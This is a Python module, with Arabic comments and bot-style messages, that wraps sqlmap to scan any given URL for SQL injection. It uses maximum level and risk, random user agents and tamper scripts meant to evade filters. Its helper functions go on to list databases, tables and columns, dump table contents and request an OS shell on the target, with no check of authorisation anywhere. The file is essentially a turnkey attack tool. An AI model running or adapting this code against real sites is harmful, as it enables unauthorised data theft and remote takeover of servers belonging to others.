#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
💾 SQLMap SQL Injection Testing Module - Pro Version
أداة اختبار ثغرات SQL Injection باستخدام SQLMap المطور
"""

import subprocess
import asyncio
import json
import os
import tempfile

async def sqlmap_scan(target_url: str, param: str = "", method: str = "GET", level: int = 3, risk: int = 3, crawl: int = 0, extra_args: list = None) -> str:
    """
    فحص ثغرات SQL Injection باستخدام SQLMap المطور
    """
    if not target_url or not target_url.startswith('http'):
        return "❌ يرجى توفير رابط صحيح (http/https)"
    
    try:
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as f:
            temp_file = f.name
        
        try:
            cmd = ['sqlmap', '-u', target_url, '--batch', '--json-file', temp_file, '--random-agent']
            cmd.extend(['--level', str(level), '--risk', str(risk)])
            
            if crawl > 0:
                cmd.extend(['--crawl', str(crawl)])
            
            if param:
                cmd.extend(['-p', param])
            
            if method.upper() == 'POST':
                cmd.append('--method=POST')
            
            if extra_args:
                cmd.extend(extra_args)
            
            # Tamper scripts for bypass
            cmd.append('--tamper=space2comment,between,randomcase')
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(),
                    timeout=300
                )
                output = stdout.decode('utf-8', errors='ignore')
            except asyncio.TimeoutError:
                return "⚠️ انتهت المهلة (300ث). الفحص قد يكون مستمراً في الخلفية أو الموقع بطيء جداً."

            text = f"💾 *نتائج SQLMap المتقدمة:* `{target_url[:50]}...`\n"
            text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"

            # Check if JSON file exists and has content
            found_vuln = False
            if os.path.exists(temp_file) and os.path.getsize(temp_file) > 0:
                try:
                    with open(temp_file, 'r', encoding='utf-8') as f:
                        results = json.load(f)
                    
                    if results:
                        for item in results:
                            if isinstance(item, dict) and item.get('vulnerable'):
                                found_vuln = True
                                text += f"⚠️ *تم اكتشاف ثغرة!* ({item.get('parameter', 'N/A')})\n"
                                text += f"🎯 *النوع:* {item.get('injection', 'N/A')}\n"
                                text += f"🗄 *النظام:* {item.get('dbms', 'N/A')}\n\n"
                except:
                    pass
            
            # Text output analysis (fallback/supplement)
            lower_output = output.lower()
            if not found_vuln:
                if "is vulnerable" in lower_output or "vulnerable:" in lower_output:
                    text += "🔥 *تحذير:* تم رصد علامات ثغرة في المخرجات النصية!\n"
                    found_vuln = True
            
            if "fetched" in lower_output or "payload:" in lower_output:
                 text += "✅ تم استخراج بيانات أو تأكيد الحقن بنجاح!\n"
                 
            if not found_vuln:
                 if "all tested parameters do not appear to be vulnerable" in lower_output:
                     text += "✅ الموقع يبدو آمناً من هذا النوع من الحقن."
                 else:
                     text += "ℹ️ الفحص لم يجد ثغرات مباشرة. جرب زيادة المستوى (Level) أو المخاطرة (Risk)."

            return text
            
        finally:
            if os.path.exists(temp_file):
                try:
                    os.remove(temp_file)
                except:
                    pass
    except Exception as e:
        return f"❌ خطأ تقني: {str(e)}"

async def sqlmap_deep_scan(target_url: str) -> str:
    """فحص عميق وشامل لكل شيء"""
    return await sqlmap_scan(target_url, level=5, risk=3, crawl=3)

async def sqlmap_param_scan(target_url: str, param: str) -> str:
    """فحص معامل محدد"""
    return await sqlmap_scan(target_url, param=param)

async def sqlmap_exploit_db(target_url: str) -> str:
    """محاولة استخراج قواعد البيانات"""
    return await sqlmap_scan(target_url, extra_args=['--dbs', '--threads=5'])

async def sqlmap_exploit_tables(target_url: str, db: str) -> str:
    """محاولة استخراج الجداول من قاعدة بيانات معينة"""
    return await sqlmap_scan(target_url, extra_args=['-D', db, '--tables', '--threads=5'])

async def sqlmap_exploit_columns(target_url: str, db: str, table: str) -> str:
    """محاولة استخراج الأعمدة من جدول معين"""
    return await sqlmap_scan(target_url, extra_args=['-D', db, '-T', table, '--columns', '--threads=5'])

async def sqlmap_dump_data(target_url: str, db: str, table: str) -> str:
    """سحب البيانات من جدول معين"""
    return await sqlmap_scan(target_url, extra_args=['-D', db, '-T', table, '--dump', '--threads=5'])

async def sqlmap_os_shell(target_url: str) -> str:
    """محاولة الحصول على OS Shell"""
    return await sqlmap_scan(target_url, extra_args=['--os-shell'])
